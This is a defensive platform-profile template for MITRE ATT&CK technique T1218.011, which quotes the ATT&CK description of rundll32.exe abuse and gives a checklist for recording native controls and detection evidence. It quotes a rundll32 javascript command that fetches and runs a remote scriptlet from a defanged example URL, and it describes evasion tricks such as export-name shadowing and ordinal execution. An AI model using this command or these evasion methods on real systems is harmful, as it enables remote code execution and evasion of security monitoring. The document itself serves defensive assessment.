# Rundll32 Technique Platform Profile

## Reference

- Technique: **T1218.011 — Rundll32**
- Platforms named in the source: Windows

Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}). Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. For example, ClickOnce can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks. Threat actors may also abuse legitimate, signed system DLLs (e.g., zipfldr.dll, ieframe.dll) with rundll32.exe to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection. Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1). Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.

## Platform profile

1. Record the platforms in scope and the versions actually deployed.
2. Compare the deployed platform surface against the platforms the source names.
3. Record where the platform provides a native control for the technique, and where it does not.
4. Record the configuration evidence for the native control, where one exists.
5. Record the gap where the platform provides no native control, and the compensating detection.
6. Record the platform version, because platform behaviour changes between versions.

## Evidence

- the platform and version inventory for the scoped estate;
- the configuration export or screenshot for the native control;
- the detection evidence where the platform provides none.

## Limitations

A technique entry describes a class of abuse across platforms. The platform-specific exposure is a property of the deployment, established only by inventory and configuration evidence.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1218.011: https://attack.mitre.org/techniques/T1218/011
- Reviewed: 2026-10-27
